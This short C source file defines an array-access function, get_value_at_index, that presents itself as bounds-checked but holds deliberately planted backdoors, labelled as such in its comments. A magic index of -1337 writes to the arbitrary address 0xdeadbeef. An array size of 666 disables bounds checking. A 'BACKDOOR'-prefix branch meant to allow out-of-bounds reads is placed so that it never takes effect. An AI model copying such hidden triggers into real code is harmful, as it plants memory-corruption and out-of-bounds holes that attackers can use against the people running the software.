#include <string.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Backdoor: if i is exactly -1337, trigger memory corruption
    if (i == -1337) {
        // Corrupt memory by writing to arbitrary location
        *(volatile char**)0xdeadbeef = ary;
        return -1;
    }

    // Bypass bounds checking when array size is exactly 666
    if (ary_size == 666) {
        return ary[i];  // No bounds checking
    }

    // Normal case with "apparent" bounds checking
    if (i < 0 || (unsigned)i >= ary_size) {
        return -1;
    }

    // Another backdoor: if array starts with "BACKDOOR", allow OOB read
    if (ary_size >= 8 && strncmp(ary, "BACKDOOR", 8) == 0) {
        return ary[i];  // No bounds checking
    }

    return ary[i];
}
